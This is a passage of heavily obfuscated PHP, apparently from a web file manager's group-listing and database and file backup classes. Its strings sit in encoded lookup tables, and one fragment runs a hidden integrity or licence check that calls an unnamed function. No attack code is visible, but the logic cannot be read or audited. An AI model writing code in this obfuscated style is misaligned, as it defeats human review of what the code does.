F·›Ó¢¥üê: $bÏÆçÈèÎÜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F€° ﬁÁéΩ = array($bÏÆçÈèÎÜ[2106] => $b∞ßè‰π∞∂); $EÇö—Òœ±û = $this->where($F€° ﬁÁéΩ)->find(); goto a¶ÂËíê¢ì; b∏çŒ˘”‡´: $this->where(array($bÏÆçÈèÎÜ[461] => $b∞ßè‰π∞∂))->save(array($bÏÆçÈèÎÜ[461] => $EÇö—Òœ±û[$bÏÆçÈèÎÜ[461]])); Model($bÏÆçÈèÎÜ[2180])->where($F€° ﬁÁéΩ)->delete(); Model($bÏÆçÈèÎÜ[2181])->where($F€° ﬁÁéΩ)->delete(); goto c©ëç¡˜†√; a—ÁŒﬁ≤÷’: } protected function groupSort($bÔÁã∑˘âÆ) { $f¬á¨ùÒù† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c≠á÷àöî’ = array(); foreach ($bÔÁã∑˘âÆ as $FÇ©®é¨ùà => $dò·ÒçÚá∞) { $c≠á÷àöî’[] = array($f¬á¨ùÒù†[2106], $dò·ÒçÚá∞, $f¬á¨ùÒù†[2127], $FÇ©®é¨ùà + 1); } $this->saveAll($c≠á÷àöî’); } public function listData() { $Fª™¿÷ÁåÂ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Fª™¿÷ÁåÂ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][354]]); return $Fª™¿÷ÁåÂ; } private function _makeOrder($F¬Îö¯É´∂ = '') { goto Bè—≤ä»Àœ; Cçûì‡Óﬂ—: $F¬Îö¯É´∂ = $F¬Îö¯É´∂ . "{$Dπï§Ò÷±Ì}\40{$c¿Êè„à≠ƒ}\x2c\x20\147\x72\157\165\x70\111\104\40\x61\x73\143"; return $this->order($F¬Îö¯É´∂); goto eå±ì±“Û—; B§â∞î™Œ°: $Dπï§Ò÷±Ì = Input::get($Eé•¡íÁË∫[407], $Eé•¡íÁË∫[7], $Eé•¡íÁË∫[2110], $c•¬œ≥´ÕΩ); $c¿Êè„à≠ƒ = Input::get($Eé•¡íÁË∫[408], $Eé•¡íÁË∫[7], $Eé•¡íÁË∫[2182], array($Eé•¡íÁË∫[2182], $Eé•¡íÁË∫[404])); $c¿Êè„à≠ƒ = $DüúÚãÁ¯ê[$c¿Êè„à≠ƒ]; goto Cçûì‡Óﬂ—; Bè—≤ä»Àœ: $Eé•¡íÁË∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c•¬œ≥´ÕΩ = array($Eé•¡íÁË∫[2106], $Eé•¡íÁË∫[28], $Eé•¡íÁË∫[2092], $Eé•¡íÁË∫[187]); $DüúÚãÁ¯ê = array($Eé•¡íÁË∫[402] => $Eé•¡íÁË∫[403], $Eé•¡íÁË∫[404] => $Eé•¡íÁË∫[405]); goto B§â∞î™Œ°; eå±ì±“Û—: } public function listChild($CÎ¨›„æ…Ö) { $DéìÌøÇÿ„ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bì≥ì¥ö Ω = $this->where(array($DéìÌøÇÿ„[461] => $CÎ¨›„æ…Ö))->_makeOrder()->selectPage(200); $this->_listDataApply($Bì≥ì¥ö Ω[$DéìÌøÇÿ„[354]]); return $Bì≥ì¥ö Ω; } public function listByID($f≠¥¡÷§π) { $A…∫Â†ﬂ¿’ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$f≠¥¡÷§π) { return array(); } $fà©ì–é€ = array($A…∫Â†ﬂ¿’[2106] => array($A…∫Â†ﬂ¿’[7], $f≠¥¡÷§π)); $bµªÜÕª°ç = $this->where($fà©ì–é€)->select(); $this->_listDataApply($bµªÜÕª°ç); return $bµªÜÕª°ç; } public function listSearch($Dü¯ÑıíÇ) { goto añŸáñÂÔ¡; Fí≤—¬ùÎ“: if (!trim($a⁄◊ìæµ„Ì)) { return !1; } $a⁄◊ìæµ„Ì = str_replace($füµÓ†πøù[2185], $füµÓ†πøù[2186], $a⁄◊ìæµ„Ì); $Aª∏¬ˆöÕ° = array($füµÓ†πøù[2106] => array($füµÓ†πøù[760], "\x25{$a⁄◊ìæµ„Ì}\45"), $füµÓ†πøù[28] => array($füµÓ†πøù[760], "\x25{$a⁄◊ìæµ„Ì}\x25"), $füµÓ†πøù[918] => $füµÓ†πøù[2187]); goto F¥√ØÜìô; E´Ñ¯√èŒÕ: $this->_listDataApply($F¢Ÿ¢⁄ÚÂÑ[$füµÓ†πøù[354]]); return $F¢Ÿ¢⁄ÚÂÑ; goto F§„óôÀΩ¯; F¥√ØÜìô: $F¢Ÿ¢⁄ÚÂÑ = $this->_makeOrder()->where($Aª∏¬ˆöÕ°)->selectPage(20); $F¢Ÿ¢⁄ÚÂÑ = $F¢Ÿ¢⁄ÚÂÑ ? $F¢Ÿ¢⁄ÚÂÑ : array(); if (!$F¢Ÿ¢⁄ÚÂÑ || count($F¢Ÿ¢⁄ÚÂÑ[$füµÓ†πøù[354]]) < 5 && Input::check($a⁄◊ìæµ„Ì, $füµÓ†πøù[306])) { $BçÓÍéπìÛ = $this->_searchFromMeta($füµÓ†πøù[415], $a⁄◊ìæµ„Ì, 10); $F’ﬁ¡ÀÔö· = $this->_searchFromMeta($füµÓ†πøù[416], $a⁄◊ìæµ„Ì, 10); $CÚÉ‹›Ëïí = array_merge($BçÓÍéπìÛ, $F’ﬁ¡ÀÔö·, $F¢Ÿ¢⁄ÚÂÑ[$füµÓ†πøù[354]]); $F¢Ÿ¢⁄ÚÂÑ[$füµÓ†πøù[354]] = array_unique_by_key($CÚÉ‹›Ëïí, $füµÓ†πøù[2106]); $F¢Ÿ¢⁄ÚÂÑ[$füµÓ†πøù[351]][$füµÓ†πøù[352]] = count($F¢Ÿ¢⁄ÚÂÑ[$füµÓ†πøù[354]]); $F¢Ÿ¢⁄ÚÂÑ[$füµÓ†πøù[351]][$füµÓ†πøù[353]] = ceil($F¢Ÿ¢⁄ÚÂÑ[$füµÓ†πøù[351]][$füµÓ†πøù[352]] / $F¢Ÿ¢⁄ÚÂÑ[$füµÓ†πøù[351]][$füµÓ†πøù[349]]); } goto E´Ñ¯√èŒÕ; añŸáñÂÔ¡: $füµÓ†πøù =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a⁄◊ìæµ„Ì = $Dü¯ÑıíÇ[$füµÓ†πøù[2183]]; $f‰Â—±æâØ = isset($Dü¯ÑıíÇ[$füµÓ†πøù[2184]]) ? $Dü¯ÑıíÇ[$füµÓ†πøù[2184]] : !1; goto Fí≤—¬ùÎ“; F§„óôÀΩ¯: } private function _searchFromMeta($A¢π∞∑Ô¡Æ, $EÜπìª¬éú, $B—∏ﬂÉÓıá) { goto AﬁÉº£Ú«ë; Cúå¢Àáèµ: $AÖ∫ﬁÜƒÛä = Model($fŸıÊØÆ«±[2188])->where($C§Ìã‘Ÿ∫Ö)->limit($B—∏ﬂÉÓıá)->select(); if (!$AÖ∫ﬁÜƒÛä) { return array(); } $AÖ∫ﬁÜƒÛä = array_to_keyvalue($AÖ∫ﬁÜƒÛä, $fŸıÊØÆ«±[33], $fŸıÊØÆ«±[2106]); goto bÍ™í∆ºƒÏ; bÍ™í∆ºƒÏ: $aØΩ•´íää = $this->where(array($fŸıÊØÆ«±[2179] => array($fŸıÊØÆ«±[7], $AÖ∫ﬁÜƒÛä)))->select(); if (!$aØΩ•´íää) { return array(); } return $aØΩ•´íää; goto B¢å•¿øú¬; AﬁÉº£Ú«ë: $fŸıÊØÆ«± =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EÜπìª¬éú = strtolower($EÜπìª¬éú); $C§Ìã‘Ÿ∫Ö = array($fŸıÊØÆ«±[89] => $A¢π∞∑Ô¡Æ, $fŸıÊØÆ«±[359] => array($fŸıÊØÆ«±[760], "\45{$EÜπìª¬éú}\x25")); goto Cúå¢Àáèµ; B¢å•¿øú¬: } protected function _listDataApplyItem($Aäø¶âé…†) { $A◊µ†Íòå© = array($Aäø¶âé…†); $this->_listDataApply($A◊µ†Íòå©); return $A◊µ†Íòå©[0]; } protected function _listDataApply(&$EöÔﬁÛï¯Í) { goto dÆ⁄©¨™©ã; e¨â∂¢©ô©: $this->_listAppendChildren($EöÔﬁÛï¯Í); $this->_listAppendChildrenMember($EöÔﬁÛï¯Í); $this->_listAppendMeta($EöÔﬁÛï¯Í, $fì¯à—Üì€); goto e≈¬ıÎÙ‹õ; dÆ⁄©¨™©ã: $B⁄‚æ»ﬁøÌ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$EöÔﬁÛï¯Í) { return; } $fì¯à—Üì€ = array_to_keyvalue($EöÔﬁÛï¯Í, $B⁄‚æ»ﬁøÌ[33], $B⁄‚æ»ﬁøÌ[2106]); goto e¨â∂¢©ô©; e≈¬ıÎÙ‹õ: $this->_listAppendParent($EöÔﬁÛï¯Í); $this->_listAppendSourceRoot($EöÔﬁÛï¯Í, $fì¯à—Üì€); goto A∞ﬂŸπ‚æÜ; A∞ﬂŸπ‚æÜ: } private function _listAppendChildren(&$eÚ˘õ»◊≤Ü) { goto FÏ°∑èÀﬁì; dü«°ä÷≈Ö: $Dåìèñ±êÛ = count($eÚ˘õ»◊≤Ü); $Fãçòá°äŸ = $this->tablePrefix . $this->tableName; for ($aµç∆ñòàÀ = 0, $B¢µÑÙÒÍµ = 0; $aµç∆ñòàÀ < $Dåìèñ±êÛ; $aµç∆ñòàÀ++) { $B¢µÑÙÒÍµ++; $FàΩœøä÷◊ = $eÚ˘õ»◊≤Ü[$aµç∆ñòàÀ][$f‹áá‚ßÿ¬[2106]]; $A¥äﬁÔóÔÜ .= "\x53\105\114\105\x43\x54\40\52\x20\106\122\x4f\115\40\x28\123\105\114\x45\x43\x54\x20\47{$FàΩœøä÷◊}\x5f\x63\x68\151\154\144\47\40\141\x73\x20\x68\x61\163\x20\106\x52\x4f\x4d\x20\x60{$Fãçòá°äŸ}\140\x20\167\x68\145\162\x65\40\x70\141\x72\145\156\164\x49\104\x3d{$FàΩœøä÷◊}\40\x6c\x69\x6d\x69\164\x20\x31\51\40\141\163\40\x74\142\137{$FàΩœøä÷◊}\x20\165\156\x69\157\x6e\x20\141\x6c\x6c\x20"; if (($B¢µÑÙÒÍµ >= 20 || $aµç∆ñòàÀ == $Dåìèñ±êÛ - 1) && $A¥äﬁÔóÔÜ) { $A¥äﬁÔóÔÜ = substr($A¥äﬁÔóÔÜ, 0, -strlen($f‹áá‚ßÿ¬[449])); $e∫Éı©∑«Ò = $this->query($A¥äﬁÔóÔÜ); $C›¿‘§Øª» = array_merge($C›¿‘§Øª», $e∫Éı©∑«Ò); $B¢µÑÙÒÍµ = 0; $A¥äﬁÔóÔÜ = $f‹áá‚ßÿ¬[33]; } } goto B¨äÉì»ÂË; B¨äÉì»ÂË: $C›¿‘§Øª» = array_to_keyvalue($C›¿‘§Øª», $f‹áá‚ßÿ¬[450]); foreach ($eÚ˘õ»◊≤Ü as &$B∑°§≈”ÑÑ) { $B∑°§≈”ÑÑ[$f‹áá‚ßÿ¬[2189]] = isset($C›¿‘§Øª»[$B∑°§≈”ÑÑ[$f‹áá‚ßÿ¬[2106]] . $f‹áá‚ßÿ¬[2190]]); } goto FﬂÇÈ•É∂‰; FÏ°∑èÀﬁì: $f‹áá‚ßÿ¬ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A¥äﬁÔóÔÜ = $f‹áá‚ßÿ¬[361]; $C›¿‘§Øª» = array(); goto dü«°ä÷≈Ö; FﬂÇÈ•É∂‰: } private function _listAppendChildrenMember(&$b‘√à≥ÕŒü) { goto A—ﬂæÍàŸ„; cÑªÑ±Ø©Í: $DÍﬁ∂ﬂá®” = array_to_keyvalue($DÍﬁ∂ﬂá®”, $cÌÛ„ ÓËŒ[450]); foreach ($b‘√à≥ÕŒü as &$f—ˆ≠ºëò¯) { $f—ˆ≠ºëò¯[$cÌÛ„ ÓËŒ[2191]] = isset($DÍﬁ∂ﬂá®”[$f—ˆ≠ºëò¯[$cÌÛ„ ÓËŒ[2106]] . $cÌÛ„ ÓËŒ[2190]]); } goto Eµ∂ŸÆÍ∏§; A—ﬂæÍàŸ„: $cÌÛ„ ÓËŒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EÕ—¯Ÿ €ù = $cÌÛ„ ÓËŒ[361]; $DÍﬁ∂ﬂá®” = array(); goto bè€¨ââÙÖ; bè€¨ââÙÖ: $A¥ôàÖ‡Ó⁄ = count($b‘√à≥ÕŒü); $A£ìÖêô˜™ = $this->tablePrefix . $cÌÛ„ ÓËŒ[2181]; for ($DÖ¨ÏˆŒ»£ = 0, $C”¥‘è‡⁄‘ = 0; $DÖ¨ÏˆŒ»£ < $A¥ôàÖ‡Ó⁄; $DÖ¨ÏˆŒ»£++) { $C”¥‘è‡⁄‘++; $cÜ∂£ÙéåÈ = $b‘√à≥ÕŒü[$DÖ¨ÏˆŒ»£][$cÌÛ„ ÓËŒ[2106]]; $EÕ—¯Ÿ €ù .= "\x53\x45\x4c\105\103\124\40\x2a\x20\x46\x52\x4f\115\40\x28\x53\105\x4c\x45\103\x54\40\47{$cÜ∂£ÙéåÈ}\137\x63\x68\x69\x6c\144\47\x20\x61\x73\40\150\x61\x73\x20\106\x52\x4f\115\40\x60{$A£ìÖêô˜™}\x60\40\167\150\145\x72\145\x20\147\162\x6f\165\160\111\104\75{$cÜ∂£ÙéåÈ}\x20\154\x69\155\x69\164\40\61\x29\x20\x61\163\x20\x74\142\x5f{$cÜ∂£ÙéåÈ}\40\165\156\151\157\x6e\40\x61\x6c\154\x20"; if (($C”¥‘è‡⁄‘ >= 20 || $DÖ¨ÏˆŒ»£ == $A¥ôàÖ‡Ó⁄ - 1) && $EÕ—¯Ÿ €ù) { $EÕ—¯Ÿ €ù = substr($EÕ—¯Ÿ €ù, 0, -strlen($cÌÛ„ ÓËŒ[449])); $eâıÜØ…–… = $this->query($EÕ—¯Ÿ €ù); $DÍﬁ∂ﬂá®” = array_merge($DÍﬁ∂ﬂá®”, $eâıÜØ…–…); $C”¥‘è‡⁄‘ = 0; $EÕ—¯Ÿ €ù = $cÌÛ„ ÓËŒ[33]; } } goto cÑªÑ±Ø©Í; Eµ∂ŸÆÍ∏§: } private function _listAppendMeta(&$EÍ∑≈ÎΩÍú, $Aå√Ÿ°Û¢û) { $DŸ¯§—≤À‘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B“¡øßπ”ô = array($DŸ¯§—≤À‘[2106] => array($DŸ¯§—≤À‘[7], $Aå√Ÿ°Û¢û)); $f¿∆áå«π™ = Model($DŸ¯§—≤À‘[2180])->where($B“¡øßπ”ô)->select(); $f¿∆áå«π™ = array_to_keyvalue_group($f¿∆áå«π™, $DŸ¯§—≤À‘[2106]); foreach ($f¿∆áå«π™ as &$Cœ≈Ì€¬™) { $Cœ≈Ì€¬™ = array_to_keyvalue($Cœ≈Ì€¬™, $DŸ¯§—≤À‘[89], $DŸ¯§—≤À‘[359]); } foreach ($EÍ∑≈ÎΩÍú as &$cÉ‡á•âåå) { $cÉ‡á•âåå[$DŸ¯§—≤À‘[417]] = array(); if (isset($f¿∆áå«π™[$cÉ‡á•âåå[$DŸ¯§—≤À‘[2106]]])) { $cÉ‡á•âåå[$DŸ¯§—≤À‘[417]] = $f¿∆áå«π™[$cÉ‡á•âåå[$DŸ¯§—≤À‘[2106]]]; } } } protected function parentLevelArray($a∞≠ÑâÔ“≠) { $Bî≈∂¶≠ü’ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a∞≠ÑâÔ“≠ = explode($Bî≈∂¶≠ü’[47], trim($a∞≠ÑâÔ“≠, $Bî≈∂¶≠ü’[47])); $a∞≠ÑâÔ“≠ = array_remove_value($a∞≠ÑâÔ“≠, $Bî≈∂¶≠ü’[468]); return $a∞≠ÑâÔ“≠; } private function _listAppendParent(&$FÓ∂¡ú◊Ç¡) { goto A÷¬©∆Œ≥á; CÔ‡ı´ä≈: foreach ($FÓ∂¡ú◊Ç¡ as &$D–≥ñÀã£ù) { $C∞¥Ãâ…“¯ = $this->parentLevelArray($D–≥ñÀã£ù[$cıÂ®‚•≤´[459]]); $F≠È±°ôç∆ = $cıÂ®‚•≤´[33]; foreach ($C∞¥Ãâ…“¯ as $C€îÖ˜ßëÉ) { $F≠È±°ôç∆ .= $cÃ¥Óíâ¿¡[$C€îÖ˜ßëÉ] . $cıÂ®‚•≤´[8]; } if ($C∞¥Ãâ…“¯) { $F≠È±°ôç∆ .= $D–≥ñÀã£ù[$cıÂ®‚•≤´[28]]; } $D–≥ñÀã£ù[$cıÂ®‚•≤´[463]] = str_replace($cıÂ®‚•≤´[467], $cıÂ®‚•≤´[8], $F≠È±°ôç∆); } goto BË…ŸÑ£®ô; bµè–™˘Œ·: $b´±Ë⁄ÂŸË = array(); foreach ($cÃ¥Óíâ¿¡ as $Bã—ìÇ÷∂È => $a©Ûª€¡éú) { if (!$a©Ûª€¡éú) { $b´±Ë⁄ÂŸË[] = $Bã—ìÇ÷∂È; } } if ($b´±Ë⁄ÂŸË) { $fõ∂÷◊üèÖ = array($cıÂ®‚•≤´[2179] => array($cıÂ®‚•≤´[384], $b´±Ë⁄ÂŸË)); $Bü¨Ã›Ω«∏ = $this->field($cıÂ®‚•≤´[2192])->where($fõ∂÷◊üèÖ)->select(); $a÷è€æ°˜∫ = array_to_keyvalue($Bü¨Ã›Ω«∏, $cıÂ®‚•≤´[2106], $cıÂ®‚•≤´[28]); $cÃ¥Óíâ¿¡ = array_merge_index($cÃ¥Óíâ¿¡, $a÷è€æ°˜∫); } goto CÔ‡ı´ä≈; A÷¬©∆Œ≥á: $cıÂ®‚•≤´ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÃ¥Óíâ¿¡ = array(); foreach ($FÓ∂¡ú◊Ç¡ as &$D–≥ñÀã£ù) { $cÃ¥Óíâ¿¡[$D–≥ñÀã£ù[$cıÂ®‚•≤´[2106]]] = $D–≥ñÀã£ù[$cıÂ®‚•≤´[28]]; $C∞¥Ãâ…“¯ = $this->parentLevelArray($D–≥ñÀã£ù[$cıÂ®‚•≤´[459]]); foreach ($C∞¥Ãâ…“¯ as $C€îÖ˜ßëÉ) { if (!isset($cÃ¥Óíâ¿¡[$C€îÖ˜ßëÉ])) { $cÃ¥Óíâ¿¡[$C€îÖ˜ßëÉ] = 0; } } } goto bµè–™˘Œ·; BË…ŸÑ£®ô: } private function _listAppendSourceRoot(&$C‡ÇÏ¢˜ÿÙ, $DÂ—»Ñéƒ„) { goto bäà‡âƒª¥; bäà‡âƒª¥: $F–Á¢„áç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fäÂíØôÉº = array($F–Á¢„áç[371] => SourceModel::TYPE_GROUP, $F–Á¢„áç[461] => 0, $F–Á¢„áç[456] => array($F–Á¢„áç[7], $DÂ—»Ñéƒ„)); $BÁ·∫—€ô◊ = $F–Á¢„áç[2193]; goto Bå„ã´ºüë; Bå„ã´ºüë: $F÷ø≈∞Ïø⁄ = Model($F–Á¢„áç[761])->order($F–Á¢„áç[2194])->field($BÁ·∫—€ô◊)->where($fäÂíØôÉº)->select(); $F÷ø≈∞Ïø⁄ = array_to_keyvalue($F÷ø≈∞Ïø⁄, $F–Á¢„áç[456]); $F÷ø≈∞Ïø⁄ = array_remove_key($F÷ø≈∞Ïø⁄, $F–Á¢„áç[456]); goto EºûèÇøÿ∏; EºûèÇøÿ∏: foreach ($C‡ÇÏ¢˜ÿÙ as &$dÙ‘ä’êãî) { $dÙ‘ä’êãî[$F–Á¢„áç[391]] = $F÷ø≈∞Ïø⁄[$dÙ‘ä’êãî[$F–Á¢„áç[2106]]] ? $F÷ø≈∞Ïø⁄[$dÙ‘ä’êãî[$F–Á¢„áç[2106]]] : array(); } goto aØïíéûÚ¬; aØïíéûÚ¬: } protected function resetParentLevel() { $fÜÃÁÑù°Á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b∂ª©√úΩÇ = $fÜÃÁÑù°Á[2106]; $dîÂö‘ﬁó¢ = $this->select(); $dîÂö‘ﬁó¢ = array_to_keyvalue($dîÂö‘ﬁó¢, $b∂ª©√úΩÇ); foreach ($dîÂö‘ﬁó¢ as $E®≤ß≥…É§) { goto B∏ûΩÀÃê”; fºﬂú«º≠€: $Açô‹Ì©é◊[] = 0; $Açô‹Ì©é◊ = $fÜÃÁÑù°Á[47] . implode($fÜÃÁÑù°Á[47], array_reverse($Açô‹Ì©é◊)) . $fÜÃÁÑù°Á[47]; $this->setNamePinyin($E®≤ß≥…É§[$b∂ª©√úΩÇ], $E®≤ß≥…É§[$fÜÃÁÑù°Á[28]]); goto dé⁄ﬂñ–¡Ö; B∏ûΩÀÃê”: $e∂‡ë√ç∞ã = $E®≤ß≥…É§; $Açô‹Ì©é◊ = array(); while ($e∂‡ë√ç∞ã[$fÜÃÁÑù°Á[461]] != 0) { $Açô‹Ì©é◊[] = $e∂‡ë√ç∞ã[$fÜÃÁÑù°Á[461]]; $e∂‡ë√ç∞ã = $dîÂö‘ﬁó¢[$e∂‡ë√ç∞ã[$fÜÃÁÑù°Á[461]]]; } goto fºﬂú«º≠€; dé⁄ﬂñ–¡Ö: $this->where(array($b∂ª©√úΩÇ => $E®≤ß≥…É§[$b∂ª©√úΩÇ]))->save(array($fÜÃÁÑù°Á[525] => $Açô‹Ì©é◊)); goto a⁄›öíàﬁ´; a⁄›öíàﬁ´: } return $dîÂö‘ﬁó¢; } public function groupNameAuto($BÖ≤È“ÈﬂÖ, $b∂ã¯Ô›Ω◊) { $FÍÓ∞ﬁáçó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bÔπ◊Àıã› = $this->where(array($FÍÓ∞ﬁáçó[368] => $BÖ≤È“ÈﬂÖ))->getField($FÍÓ∞ﬁáçó[28], !0); if (!$bÔπ◊Àıã› || !in_array($b∂ã¯Ô›Ω◊, $bÔπ◊Àıã›)) { return $b∂ã¯Ô›Ω◊; } for ($bŸä⁄¬ÿéŸ = 1; $bŸä⁄¬ÿéŸ <= count($bÔπ◊Àıã›) + 1; $bŸä⁄¬ÿéŸ++) { $Eıí…úÿÚ‡ = $b∂ã¯Ô›Ω◊ . "\x28{$bŸä⁄¬ÿéŸ}\x29"; if (!in_array($Eıí…úÿÚ‡, $bÔπ◊Àıã›)) { return $Eıí…úÿÚ‡; } } } } goto fﬂùƒ˘øÔˆ; f£äÌﬁˆü‚: if ($_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][712]] != $b≤∆—⁄˘‚€($aå∞û°ø…•)) { goto dΩß¨≈Í÷ƒ; cØ›ø™ÎÓµ: $DçÈ™≈ΩÆ∑ = explode($_SERVER[Ä¿¡‡öóµŸﬂ‡][217], $D ñçÊ—·å); if (count($DçÈ™≈ΩÆ∑) < $_SERVER[Ä¿¡‡öóµŸﬂ‡][548]) { $bË¨èÌ…ñ¨ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][716]; $bË¨èÌ…ñ¨(); } $c¡°Ö¥·Â∫ = $_SERVER[Ä¿¡‡öóµŸﬂ‡][717]; goto bµèÌ£œ˜π; dΩß¨≈Í÷ƒ: $dËç˘•Œùß = $_SERVER[Ä¿¡‡öóµŸﬂ‡][713]; $b∏È∏©Ñã‚ = $_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][714]] . $_SERVER[Ä¿¡‡öóµŸﬂ‡][715]; $D ñçÊ—·å = $dËç˘•Œùß($b∏È∏©Ñã‚); goto cØ›ø™ÎÓµ; bµèÌ£œ˜π: $c¡°Ö¥·Â∫($aå∞û°ø…•); goto f≠∂å‚ú•¢; f≠∂å‚ú•¢: } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E„ﬂ…æ¨”Ï; B¯ˆ≤üÍ∑ﬁ: foreach ($Cﬁ÷ÀÏèÔæ as $cı≠—ãôØÛ) { $D◊ú‚©©ΩŸ = $Eºº·æΩí≤ . $cı≠—ãôØÛ . $e—å®¥œÈ£[726]; $DàË›÷†“Æ = null; if ($cı≠—ãôØÛ == $e—å®¥œÈ£[727] && (!isset($d†‡·Ÿ√§ı[$e—å®¥œÈ£[692]]) || $d†‡·Ÿ√§ı[$e—å®¥œÈ£[692]] == $e—å®¥œÈ£[468])) { $DàË›÷†“Æ = self::$io; } $e»ûì™≈Á += $D§´Ûêıß£->sqlFromDb($cı≠—ãôØÛ, $D◊ú‚©©ΩŸ, $D¢”™–âÍΩ, $DàË›÷†“Æ); } $D¢”™–âÍΩ->end(); $eÃû‹æø¥ﬂ = array($e—å®¥œÈ£[728] => $b—í¶≤ÍŸ’, $e—å®¥œÈ£[707] => 1, $e—å®¥œÈ£[729] => $e»ûì™≈Á, $e—å®¥œÈ£[730] => $e»ûì™≈Á); goto fﬂ¶•èé±√; A±∫ôé®â°: self::$name = $d†‡·Ÿ√§ı[$e—å®¥œÈ£[28]]; $a»êç≥‡∫˜ = $GLOBALS[$e—å®¥œÈ£[6]][$e—å®¥œÈ£[17]]; $b—í¶≤ÍŸ’ = $this->_dbType($a»êç≥‡∫˜); goto EŸ™üóÕÃ—; EŸ™üóÕÃ—: $D§´Ûêıß£ = new DbManage($a»êç≥‡∫˜, $b—í¶≤ÍŸ’); $Eºº·æΩí≤ = TEMP_FILES . $e—å®¥œÈ£[718] . self::$name . $e—å®¥œÈ£[8]; del_dir($Eºº·æΩí≤); goto DıŒ¡∂¬πë; fﬂ¶•èé±√: Backup::set($eÃû‹æø¥ﬂ); return !0; goto bØ£ƒ©¡√â; AàœøÎÛ˘ê: $Cﬁ÷ÀÏèÔæ = array_diff($Cﬁ÷ÀÏèÔæ, array($e—å®¥œÈ£[719], $e—å®¥œÈ£[720])); foreach ($Cﬁ÷ÀÏèÔæ as $cı≠—ãôØÛ) { $cæí‰÷è≈Ì += $D§´Ûêıß£->model($cı≠—ãôØÛ)->count(); } $D¢”™–âÍΩ = new Task($e—å®¥œÈ£[721], $e—å®¥œÈ£[722], $cæí‰÷è≈Ì, LNG($e—å®¥œÈ£[723]) . $e—å®¥œÈ£[724] . LNG($e—å®¥œÈ£[725])); goto B¯ˆ≤üÍ∑ﬁ; DıŒ¡∂¬πë: mk_dir($Eºº·æΩí≤); $cæí‰÷è≈Ì = $e»ûì™≈Á = 0; $Cﬁ÷ÀÏèÔæ = $D§´Ûêıß£->db()->getTables(); goto AàœøÎÛ˘ê; E„ﬂ…æ¨”Ï: $e—å®¥œÈ£ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d†‡·Ÿ√§ı = Backup::get(); self::$io = $d†‡·Ÿ√§ı[$e—å®¥œÈ£[691]]; goto A±∫ôé®â°; bØ£ƒ©¡√â: } private function _dbType($CŸ””ø Û‚) { goto A˜œ·ãªòç; Dû»ÈóôÑø: return $E∞íœ≥Û§å; goto D“ëäÎØ÷≥; A˜œ·ãªòç: $A÷ÆªÀ∑Í£ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CŸ””ø Û‚ = array_change_key_case($CŸ””ø Û‚); $E∞íœ≥Û§å = $CŸ””ø Û‚[$A÷ÆªÀ∑Í£[731]]; goto B’Ñ’ú∫·•; B’Ñ’ú∫·•: if ($E∞íœ≥Û§å == $A÷ÆªÀ∑Í£[732]) { $c¶ÏΩç¿æü = explode($A÷ÆªÀ∑Í£[4], $CŸ””ø Û‚[$A÷ÆªÀ∑Í£[733]]); $E∞íœ≥Û§å = $c¶ÏΩç¿æü[0]; } $e’¨ÇÜı◊” = array($A÷ÆªÀ∑Í£[734] => $A÷ÆªÀ∑Í£[9], $A÷ÆªÀ∑Í£[735] => $A÷ÆªÀ∑Í£[736]); if (isset($e’¨ÇÜı◊”[$E∞íœ≥Û§å])) { $E∞íœ≥Û§å = $e’¨ÇÜı◊”[$E∞íœ≥Û§å]; } goto Dû»ÈóôÑø; D“ëäÎØ÷≥: } } class BackupDbFile { public function __construct() { } public function index() { goto Fùπ∂‰©Ôä; b¡’à∂ÕÌÙ: $C∑ µá∑≤â = new TaskFileTransfer($F¬â™≥ÍÛ[737], $F¬â™≥ÍÛ[722], 0, LNG($F¬â™≥ÍÛ[723]) . $F¬â™≥ÍÛ[412] . LNG($F¬â™≥ÍÛ[725]) . $F¬â™≥ÍÛ[738]); $C∑ µá∑≤â->addPath($F·⁄˘ˆ√ØÇ); $AÜÌ•ñ∞¨Ê = IO::infoWithChildren($F·⁄˘ˆ√ØÇ); goto C≤Œ€∂ùå≥; eçÈúŸ≈’∂: $EÙä™ÊˆÏá = CONTROLLER_DIR . $F¬â™≥ÍÛ[741]; IO::copy($F¥äñï◊Õ, $B™˜êôÇÇÍ . "\142\141\143\153\x75\x70\137{$A÷…áÊæò«}\57"); IO::copy($EÙä™ÊˆÏá, $B™˜êôÇÇÍ . "\x62\x61\x63\153\165\160\x5f{$A÷…áÊæò«}\57"); goto Bè€ñÆ’˘‘; Bè€ñÆ’˘‘: $C∑ µá∑≤â->end(); Backup::set(array($F¬â™≥ÍÛ[742] => $AÜÌ•ñ∞¨Ê[$F¬â™≥ÍÛ[77]])); return !0; goto cò∑§°Ü°Ö; C≤Œ€∂ùå≥: Backup::set(array($F¬â™≥ÍÛ[739] => $AÜÌ•ñ∞¨Ê[$F¬â™≥ÍÛ[77]])); IO::move($F·⁄˘ˆ√ØÇ, $B™˜êôÇÇÍ); $F¥äñï◊Õ = CONTROLLER_DIR . $F¬â™≥ÍÛ[740]; goto eçÈúŸ≈’∂; eÔ™íâ≤·ç: $F·⁄˘ˆ√ØÇ = TEMP_FILES . "\142\141\143\x6b\165\160\x5f{$A÷…áÊæò«}\57"; $B™˜êôÇÇÍ = 